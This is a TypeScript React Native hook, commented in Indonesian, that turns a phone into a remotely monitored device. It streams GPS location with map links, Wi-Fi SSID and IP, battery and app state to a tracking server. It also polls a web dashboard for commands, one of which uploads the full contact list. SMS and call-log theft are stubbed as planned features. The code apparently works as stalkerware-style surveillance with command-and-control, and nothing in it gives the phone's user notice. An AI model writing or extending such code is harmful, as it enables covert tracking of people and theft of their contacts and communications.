/**
 * use-device-monitor.ts
 * Hook utama yang memantau semua aktivitas device:
 * - Baterai (level + state) — native only
 * - Network (type + koneksi + SSID WiFi)
 * - Lokasi (koordinat GPS)
 * - App lifecycle (foreground/background) — realtime only, tidak masuk DB
 * - Info device
 * - Kontak, SMS, Call Log — on-demand via command polling
 */

import NetInfo, { NetInfoState } from '@react-native-community/netinfo';
import * as Battery from 'expo-battery';
import * as Contacts from 'expo-contacts';
import { requestPermissionsAsync as requestContactsPermissions } from 'expo-contacts';
import * as Device from 'expo-device';
import * as Location from 'expo-location';
import * as Network from 'expo-network';
import { useCallback, useEffect, useRef, useState } from 'react';
import { AppState, AppStateStatus, Platform } from 'react-native';

import {
  sendRealtimeState,
  setCommandHandler,
  startCommandPolling,
  stopCommandPolling,
  trackEvent,
  updateCommandStatus,
  type DeviceCommand,
} from '@/lib/tracker';
import { getAccountsForContacts } from '../../modules/contact-accounts/src';

export interface DeviceStatus {
  battery: {
    level: number;       // 0.0 – 1.0, -1 kalau tidak tersedia
    state: Battery.BatteryState;
    lowPowerMode: boolean;
  };
  network: {
    type: Network.NetworkStateType;
    isConnected: boolean;
    isInternetReachable: boolean;
    ssid: string | null;
    ipAddress: string | null;
  };
  location: {
    latitude: number | null;
    longitude: number | null;
    accuracy: number | null;
    permissionGranted: boolean;
  };
  device: {
    name: string | null;
    brand: string | null;
    os: string;
    osVersion: string | null;
    isDevice: boolean;
  };
  lastUpdated: Date | null;
}

const initialStatus: DeviceStatus = {
  battery: {
    level: -1,
    state: Battery.BatteryState.UNKNOWN,
    lowPowerMode: false,
  },
  network: {
    type: Network.NetworkStateType.UNKNOWN,
    isConnected: false,
    isInternetReachable: false,
    ssid: null,
    ipAddress: null,
  },
  location: {
    latitude: null,
    longitude: null,
    accuracy: null,
    permissionGranted: false,
  },
  device: {
    name: Device.deviceName ?? null,
    brand: Device.brand ?? null,
    os: Platform.OS,
    osVersion: Device.osVersion ?? null,
    isDevice: Device.isDevice,
  },
  lastUpdated: null,
};

export function useDeviceMonitor() {
  const [status, setStatus] = useState<DeviceStatus>(initialStatus);
  const [isTracking, setIsTracking] = useState(false);
  const appState = useRef<AppStateStatus>('active');
  const locationSub = useRef<Location.LocationSubscription | null>(null);

  // ─── Battery ───────────────────────────────────────────────────────────────

  const setupBatteryTracking = useCallback(() => {
    if (Platform.OS === 'web') return () => {};

    const levelSub = Battery.addBatteryLevelListener(async ({ batteryLevel }) => {
      setStatus((prev) => ({
        ...prev,
        battery: { ...prev.battery, level: batteryLevel },
        lastUpdated: new Date(),
      }));
      // battery_level tetap masuk DB
      await trackEvent('battery_level', { level: batteryLevel });
      // Juga push realtime agar web langsung update angka persen
      await sendRealtimeState({ batteryLevel });
    });

    const stateSub = Battery.addBatteryStateListener(async ({ batteryState }) => {
      setStatus((prev) => ({
        ...prev,
        battery: { ...prev.battery, state: batteryState },
        lastUpdated: new Date(),
      }));
      // battery_state: hanya realtime, TIDAK masuk DB
      await sendRealtimeState({
        batteryState: getBatteryStateLabel(batteryState).toLowerCase(),
      });
    });

    return () => {
      levelSub.remove();
      stateSub.remove();
    };
  }, []);

  // ─── Network ───────────────────────────────────────────────────────────────

  const applyNetInfoState = useCallback(
    async (state: NetInfoState) => {
      const typeMap: Record<string, Network.NetworkStateType> = {
        wifi: Network.NetworkStateType.WIFI,
        cellular: Network.NetworkStateType.CELLULAR,
        ethernet: Network.NetworkStateType.ETHERNET,
        bluetooth: Network.NetworkStateType.BLUETOOTH,
        vpn: Network.NetworkStateType.VPN,
        none: Network.NetworkStateType.NONE,
      };
      const mappedType = typeMap[state.type] ?? Network.NetworkStateType.UNKNOWN;

      const ssid =
        state.type === 'wifi' && state.details
          ? (state.details as { ssid?: string | null }).ssid ?? null
          : null;

      const ipAddress =
        state.type === 'wifi' && state.details
          ? (state.details as { ipAddress?: string | null }).ipAddress ?? null
          : null;

      setStatus((prev) => ({
        ...prev,
        network: {
          type: mappedType,
          isConnected: state.isConnected ?? false,
          isInternetReachable: state.isInternetReachable ?? false,
          ssid,
          ipAddress,
        },
        lastUpdated: new Date(),
      }));

      await trackEvent('network_change', {
        type: state.type,
        isConnected: state.isConnected,
        isInternetReachable: state.isInternetReachable,
        ssid,
        ipAddress,
      });
    },
    []
  );

  const setupNetworkTracking = useCallback(() => {
    const unsub = NetInfo.addEventListener(applyNetInfoState);
    return unsub;
  }, [applyNetInfoState]);

  // ─── Location ──────────────────────────────────────────────────────────────

  const setupLocationTracking = useCallback(async () => {
    const { status: existing } = await Location.getForegroundPermissionsAsync();

    if (existing === 'denied') {
      await Location.requestForegroundPermissionsAsync();
    }

    const { status: permStatus, canAskAgain } =
      await Location.requestForegroundPermissionsAsync();

    if (permStatus !== 'granted') {
      setStatus((prev) => ({
        ...prev,
        location: { ...prev.location, permissionGranted: false },
      }));

      if (!canAskAgain) {
        await Location.enableNetworkProviderAsync().catch(() => null);
      }

      return () => {};
    }

    setStatus((prev) => ({
      ...prev,
      location: { ...prev.location, permissionGranted: true },
    }));

    if (Platform.OS === 'android') {
      await Location.enableNetworkProviderAsync().catch(() => null);
    }

    const current = await Location.getCurrentPositionAsync({
      accuracy: Location.Accuracy.Balanced,
    });

    setStatus((prev) => ({
      ...prev,
      location: {
        ...prev.location,
        latitude: current.coords.latitude,
        longitude: current.coords.longitude,
        accuracy: current.coords.accuracy,
        permissionGranted: true,
      },
      lastUpdated: new Date(),
    }));

    await trackEvent('location_update', {
      latitude: current.coords.latitude,
      longitude: current.coords.longitude,
      accuracy: current.coords.accuracy,
      altitude: current.coords.altitude,
      speed: current.coords.speed,
      mapsUrl: `https://www.google.com/maps?q=${current.coords.latitude},${current.coords.longitude}`,
    });

    locationSub.current = await Location.watchPositionAsync(
      {
        accuracy: Location.Accuracy.Balanced,
        distanceInterval: 100,
        timeInterval: 300_000,
      },
      async (loc) => {
        setStatus((prev) => ({
          ...prev,
          location: {
            ...prev.location,
            latitude: loc.coords.latitude,
            longitude: loc.coords.longitude,
            accuracy: loc.coords.accuracy,
          },
          lastUpdated: new Date(),
        }));

        await trackEvent('location_update', {
          latitude: loc.coords.latitude,
          longitude: loc.coords.longitude,
          accuracy: loc.coords.accuracy,
          altitude: loc.coords.altitude,
          speed: loc.coords.speed,
          mapsUrl: `https://www.google.com/maps?q=${loc.coords.latitude},${loc.coords.longitude}`,
        });
      }
    );

    return () => {
      locationSub.current?.remove();
    };
  }, []);

  // ─── App Lifecycle ─────────────────────────────────────────────────────────
  // app_background & app_foreground: hanya realtime via /api/realtime, TIDAK masuk DB

  const setupLifecycleTracking = useCallback(() => {
    const sub = AppState.addEventListener('change', async (nextState: AppStateStatus) => {
      if (appState.current === 'active' && nextState === 'background') {
        // Realtime only — tidak simpan ke DB
        await sendRealtimeState({ appState: 'background' });
      } else if (appState.current === 'background' && nextState === 'active') {
        await sendRealtimeState({ appState: 'active' });
      }
      appState.current = nextState;
    });

    return () => sub.remove();
  }, []);

  // ─── Command Handler ────────────────────────────────────────────────────────
  // Eksekusi command yang dikirim dari web dashboard

  const setupCommandHandling = useCallback(() => {
    setCommandHandler(async (cmd: DeviceCommand) => {
      try {
        switch (cmd.command) {
          case 'fetch_contacts':
            await handleFetchContacts(cmd.id);
            break;
          case 'fetch_sms':
            await handleFetchSms(cmd.id);
            break;
          case 'fetch_calls':
            await handleFetchCalls(cmd.id);
            break;
          default:
            await updateCommandStatus(cmd.id, 'failed', { error: 'Unknown command' });
        }
      } catch (err) {
        await updateCommandStatus(cmd.id, 'failed', {
          error: err instanceof Error ? err.message : 'Unknown error',
        });
      }
    });

    startCommandPolling();
  }, []);

  // ─── Initial Load ──────────────────────────────────────────────────────────

  const loadInitialStatus = useCallback(async () => {
    const batteryData =
      Platform.OS !== 'web'
        ? await Promise.all([
            Battery.getBatteryLevelAsync(),
            Battery.getBatteryStateAsync(),
            Battery.isLowPowerModeEnabledAsync(),
          ])
        : ([-1, Battery.BatteryState.UNKNOWN, false] as const);

    const netState = await NetInfo.fetch();
    const typeMap: Record<string, Network.NetworkStateType> = {
      wifi: Network.NetworkStateType.WIFI,
      cellular: Network.NetworkStateType.CELLULAR,
      ethernet: Network.NetworkStateType.ETHERNET,
      bluetooth: Network.NetworkStateType.BLUETOOTH,
      vpn: Network.NetworkStateType.VPN,
      none: Network.NetworkStateType.NONE,
    };
    const ssid =
      netState.type === 'wifi' && netState.details
        ? (netState.details as { ssid?: string | null }).ssid ?? null
        : null;
    const ipAddress =
      netState.type === 'wifi' && netState.details
        ? (netState.details as { ipAddress?: string | null }).ipAddress ?? null
        : null;

    const level = batteryData[0] as number;

    setStatus((prev) => ({
      ...prev,
      battery: {
        level,
        state: batteryData[1] as Battery.BatteryState,
        lowPowerMode: batteryData[2] as boolean,
      },
      network: {
        type: typeMap[netState.type] ?? Network.NetworkStateType.UNKNOWN,
        isConnected: netState.isConnected ?? false,
        isInternetReachable: netState.isInternetReachable ?? false,
        ssid,
        ipAddress,
      },
      lastUpdated: new Date(),
    }));

    // Push initial realtime state ke web
    if (level >= 0) {
      await sendRealtimeState({
        batteryLevel: level,
        batteryState: getBatteryStateLabel(batteryData[1] as Battery.BatteryState).toLowerCase(),
        appState: 'active',
      });
    }
  }, []);

  // ─── Start Tracking ────────────────────────────────────────────────────────

  const startTracking = useCallback(async () => {
    setIsTracking(true);
    await loadInitialStatus();

    await trackEvent('app_open', {
      deviceName: Device.deviceName,
      brand: Device.brand,
      os: Platform.OS,
      osVersion: Device.osVersion,
      modelName: Device.modelName,
    });

    const cleanupBattery = setupBatteryTracking();
    const cleanupNetwork = setupNetworkTracking();
    const cleanupLifecycle = setupLifecycleTracking();
    const cleanupLocation = await setupLocationTracking();
    setupCommandHandling();

    return () => {
      cleanupBattery();
      cleanupNetwork();
      cleanupLifecycle();
      cleanupLocation();
      stopCommandPolling();
    };
  }, [
    loadInitialStatus,
    setupBatteryTracking,
    setupNetworkTracking,
    setupLifecycleTracking,
    setupLocationTracking,
    setupCommandHandling,
  ]);

  useEffect(() => {
    let cleanup: (() => void) | undefined;

    startTracking().then((fn) => {
      cleanup = fn;
    });

    return () => {
      cleanup?.();
      locationSub.current?.remove();
      setIsTracking(false);
    };
  }, [startTracking]);

  const refreshStatus = useCallback(async () => {
    await loadInitialStatus();
  }, [loadInitialStatus]);

  return { status, isTracking, refreshStatus };
}

// ─── Command Executors ────────────────────────────────────────────────────────

async function handleFetchContacts(commandId: string) {
  const { status } = await requestContactsPermissions();
  if (status !== 'granted') {
    await updateCommandStatus(commandId, 'failed', { error: 'Contacts permission denied' });
    return;
  }

  const results = await Contacts.Contact.getAllDetails(
    [Contacts.ContactField.FULL_NAME, Contacts.ContactField.PHONES, Contacts.ContactField.EMAILS],
    { limit: 500, offset: 0 }
  );

  const contacts = results.map((c) => ({
    id: c.id,
    name: c.fullName ?? null,
    // dedup: satu kontak native bisa punya nomor/email yang sama di beberapa field (Mobile, Home, dst)
    phones: Array.from(new Set(c.phones?.map((p) => p.number).filter(Boolean) ?? [])),
    emails: Array.from(new Set(c.emails?.map((e) => e.address).filter(Boolean) ?? [])),
  }));

  // Android-only: ambil sumber akun kontak (Google, SIM, WhatsApp, lokal, dll) lewat
  // native module kustom. Gagal diam-diam kalau tidak tersedia (misal masih jalan di Expo Go
  // tanpa development build, atau platform selain Android) — fitur ini best-effort.
  let accountsByContactId: Record<string, { label: string }[]> = {};
  try {
    const accountsMap = await getAccountsForContacts(contacts.map((c) => c.id));
    accountsByContactId = accountsMap;
  } catch {
    // Native module belum terpasang (perlu development build) atau platform tidak didukung
  }

  const contactsWithSource = contacts.map((c) => ({
    ...c,
    sources: (accountsByContactId[c.id] ?? []).map((a) => a.label),
  }));

  await trackEvent('contacts_sync', { count: contactsWithSource.length, contacts: contactsWithSource });
  await updateCommandStatus(commandId, 'executed', {
    count: contactsWithSource.length,
    contacts: contactsWithSource,
  });
}

async function handleFetchSms(_commandId: string) {
  // SMS access di React Native / Expo membutuhkan native module kustom
  // expo-sms hanya untuk kirim SMS, bukan baca.
  // Implementasi ini akan di-extend saat custom native module ditambahkan.
  await updateCommandStatus(_commandId, 'failed', {
    error: 'SMS reading requires a custom native module. Not yet implemented.',
  });
}

async function handleFetchCalls(_commandId: string) {
  // Call log access membutuhkan native module kustom
  // Tidak ada modul Expo resmi untuk baca call log.
  await updateCommandStatus(_commandId, 'failed', {
    error: 'Call log reading requires a custom native module. Not yet implemented.',
  });
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

export function getBatteryStateLabel(state: Battery.BatteryState): string {
  switch (state) {
    case Battery.BatteryState.CHARGING: return 'Charging';
    case Battery.BatteryState.FULL: return 'Full';
    case Battery.BatteryState.UNPLUGGED: return 'Unplugged';
    default: return 'Unknown';
  }
}

export function getNetworkTypeLabel(
  type: Network.NetworkStateType | null | undefined
): string {
  switch (type) {
    case Network.NetworkStateType.WIFI: return 'WiFi';
    case Network.NetworkStateType.CELLULAR: return 'Cellular';
    case Network.NetworkStateType.ETHERNET: return 'Ethernet';
    case Network.NetworkStateType.BLUETOOTH: return 'Bluetooth';
    case Network.NetworkStateType.NONE: return 'No Connection';
    default: return 'Unknown';
  }
}
